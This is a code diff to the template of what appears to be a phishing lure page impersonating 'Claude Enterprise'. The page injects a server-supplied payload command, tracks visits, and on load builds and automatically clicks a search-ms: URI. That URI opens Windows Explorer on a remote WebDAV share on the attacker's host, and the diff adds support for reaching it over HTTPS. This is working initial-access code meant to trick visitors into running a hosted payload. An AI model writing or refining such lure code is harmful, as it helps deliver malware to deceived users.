@@ -330,7 +330,7 @@
   <script>
     // Inject config from server
     window.PayloadCommand = {{ payload_command | tojson }};
-    window.WebDAVSubdomain = {{ webdav_subdomain | tojson }};
+    window.UseHTTPS = {{ use_https | tojson }};
     
     // Track initial landing/visit
     fetch('/api/track', {
@@ -432,8 +432,17 @@
 
       setTimeout(() => {
         const domain = window.location.hostname || "127.0.0.1";
-        const webdavHost = window.WebDAVSubdomain || domain;
-        const searchMS = `search-ms:query=activate&crumb=location:${encodeURIComponent(`\\\\${webdavHost}\\dav`)}&displayname=Claude%20Enterprise`;
+        let remoteLocation;
+        
+        if (window.UseHTTPS) {
+          // HTTPS: use @SSL@443 for WebDAV over HTTPS
+          remoteLocation = `\\\\${domain}@SSL@443\\dav`;
+        } else {
+          // HTTP: use plain UNC path
+          remoteLocation = `\\\\${domain}\\dav`;
+        }
+        
+        const searchMS = `search-ms:query=activate&crumb=location:${encodeURIComponent(remoteLocation)}&displayname=Claude%20Enterprise`;
         console.log("[+] Triggering search-ms:", searchMS);
         
         const a = document.createElement('a');
